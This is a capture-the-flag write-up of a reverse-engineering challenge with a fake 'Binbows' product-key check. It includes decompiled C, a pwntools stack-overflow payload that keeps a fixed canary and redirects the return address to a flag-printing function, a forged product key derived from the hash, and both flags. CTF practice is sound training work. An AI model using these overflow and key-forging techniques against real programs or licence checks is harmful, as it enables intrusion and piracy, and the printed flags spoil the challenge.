# Name: michaelsoft_binbows
- Category: rev
- Points: 110 (2 flags)
## Description:
u got da $200 key right
- Flag 1: 50 points
- Flag 2: 60 points
- Access: nc chal.ctf-league.osusec.org 1312
- Download: http://chal.ctf-league.osusec.org/rev/binbows/binbows

## First look at the server
Connecting to the server we get the following output:
```shell
Binbows (TM) Operating System
Copyright (C) Michaelsoft Corp. All your rights are belong to us.

Your copy of Michaelsoft Binbows needs activation!
Please enter your product key (a-z lowercase, 32 characters):
```

inputting anything over 32 bits, breaks the server saying:

```shell
Critical system error! Binbows has detected tampering. Please do not leave the room; your device will explode shortly :)
```

anything under 32 chars or exactly 32 chars, the server does not validate the key and closes

```shell
Validating product key with Michaelsoft servers...
While you wait, here's some fun Michaelsoft facts!
With new Copilot for Business, Michael himself will respond to your questions! Plans start at $2,000,000/month!
Did you know that in Michaelsoft Binbows, pressing ctrl+windows+alt+shift+l opens LinkedIn in your default browser? This way, you can stay up to date with all of the exciting updates to Michaelsoft 365!
Error: Key must be 32 characters long.
Error: Invalid product key >:(. Remember kids, you wouldn't download a car. So why download an operating system?
Please purchase a valid Binbows license to continue.
```

## Looking at the binary

We have a flag free version of the binary, so using a mix of ghidra and binary ninja we can see the assembly language, and the decompilied C code

In this C code there is two points of interest we found that look like they will give us the flags

### POI 1
```c
void print_flag_from_file(undefined4 param_1)

{
  int iVar1;
  undefined auStack_110 [256];
  int iStack_10;
  
  iStack_10 = fopen(param_1,&UNK_080bb008);
  if (iStack_10 == 0) {
    fprintf(stderr,&UNK_080bb00c,param_1);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  iVar1 = fgets(auStack_110,0x100,iStack_10);
  if (iVar1 == 0) {
    fprintf(stderr,&UNK_080bb030,param_1);
    fclose(iStack_10);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fclose(iStack_10);
  printf(&UNK_080bb05b,auStack_110);
  fflush(stdout);
  return;
}
```

this first POI is not called normally within the code, so we will need to find out how to jump to it

### POI 2
```c
undefined4 validate_key(char *param_1)
{
  size_t sVar1;
  undefined4 uVar2;
  int iVar3;
  char local_26 [17];
  undefined4 local_15;
  undefined4 local_11;
  undefined local_d;
  
  sVar1 = strlen(param_1);
  if (sVar1 == 0x21) {
    local_15 = 0;
    local_11 = 0;
    local_d = 0;
    strncpy((char *)&local_15,param_1 + 8,8);
    local_d = 0;
    local_26[0] = '\0';
    ...
    local_26[0x10] = 0;
    hash(&local_15,local_26);
    iVar3 = strncmp(local_26,param_1 + 0x10,0x10);
    if (iVar3 == 0) {
      uVar2 = 1;
    }
    else {
      fwrite("Error: Hash validation failed. Key does not match.\n",1,0x33,(FILE *)stderr);
      uVar2 = 0;
    }
  }
  else {
    fwrite("Error: Key must be 32 characters long.\n",1,0x27,(FILE *)stderr);
    uVar2 = 0;
  }
  return uVar2;
}
```

POI 2 is used in printing the second flag within the main function, it just gets the true or false from this function to do so

## Cracking POI 1 - Flag 1

The first POI is a simple function that normally never gets called, but we can call it by overwriting the return address of the main function to the address of the read_flag function

however we need to make sure that the 'canary' is not overwritten.

This value is set in the code and is 0xdeadbeef in hex.

After some experementation the following payload sent with pwntools works and does not force us out of the server, but does not get us the flag

```py
offset = 32

payload = b'a' * offset
payload += p32(0x8049855)
payload += p32(0xDEADBEEF)
payload += p32(0x8049855)
```

After some more experementation of just increnmenting the amount of address we send for the print_flag_from_file() function we found the following payload works

```py
offset = 32

payload = b'a' * offset
payload += p32(0x8049855)
payload += p32(0xDEADBEEF)
payload += p32(0x8049855)
payload += p32(0x8049855)
payload += p32(0x8049855)
payload += p32(0x8049855)
```

sending this to the server with the pwnscript.py gives us the first flag

### Flag 1
```shell
osu{Wh@+ i5 +he @ir5peed ve1oci+y of @n un1@den c@n@ry?}
```

## Cracking POI 2
The second POI seems to be behind getting the correct key to get the system to give us the flag

This means somehow getting the 32 bit key correct

however in the validate key function above shows that it first uses a hash function to check the key

and taking a closer look at this hash function...

```c

void hash(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  int local_14;
  int local_10;
  
  local_10 = 0x539;
  local_14 = 0;
  while( true ) {
    if (7 < local_14) {
      *(undefined *)(param_2 + 0x10) = 0;
      return;
    }
    if ((*(char *)(param_1 + local_14) < 'a') || ('z' < *(char *)(param_1 + local_14))) break;
    iVar1 = ((*(char *)(param_1 + local_14) + -0x61) * 2 + local_10) % 0x1a;
    iVar2 = ((*(char *)(param_1 + local_14) + -0x61) * 3) % 0x1a;
    local_10 = iVar1 - iVar2;
    *(char *)(param_2 + local_14) = (char)iVar1 + 'a';
    *(char *)(param_2 + local_14 + 8) = (char)iVar2 + 'a';
    local_14 = local_14 + 1;
  }
  fprintf((FILE *)stderr,
          "Error: Input contains invalid character \'%c\'. Only lowercase letters are allowed.\n",
          (int)*(char *)(param_1 + local_14));
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

since its hard coded we can probably re-create the output from it if needed

and looking at how it is called, it uses the user inputted key to hash it, and checks it against itself

in the strcopy in POI 2 it copies the second eight characters and passes it over to hash, and checks the hash against the last 16 characters in they key the user gave.

passing the hash function to a LLM and haing it write a python version we get hash.py

modifying it a bit to have user input and to print out the resulting hash we can get a potentially valid key

trying aaaaaaaa it gives us: 

```shell
Input:  aaaaaaaa
Output: llllllllaaaaaaaa
```

so we know the last 24 bits of the key, and the first 8 might not matter so we attempted the key:

```shell
12345678aaaaaaaallllllllaaaaaaaa
```

and this gets us the second flag

### Flag 2

```shell
osu{mich@e15of+ doe5 no+ condone pir@cy}
```

**I do not own nor did I create the content for this challenge. This is a writeup for the challenge that I solved**
